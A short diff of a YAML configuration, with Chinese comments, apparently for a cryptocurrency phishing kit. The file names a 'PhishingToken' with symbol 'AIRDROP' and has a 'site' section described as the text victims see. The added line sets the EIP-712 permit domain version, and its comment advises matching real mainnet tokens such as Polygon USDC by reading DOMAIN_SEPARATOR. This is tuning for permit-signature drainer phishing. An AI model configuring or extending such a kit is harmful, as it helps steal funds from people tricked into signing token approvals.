@@ -21,6 +21,7 @@ token:
   address: "0x8464135c8F25Da09e49BC8782676a84730C318bC"
   name: "PhishingToken"          # ⚠ 必须与合约 permit 的 EIP-712 domain.name 一字不差
   symbol: "AIRDROP"
+  permit_version: "1"            # permit EIP-712 domain.version;真实主网代币各异(如 Polygon USDC 为 "2"),用 DOMAIN_SEPARATOR 实测
 
 # 钓鱼页面包装(受害者看到的一切文案)
 site:
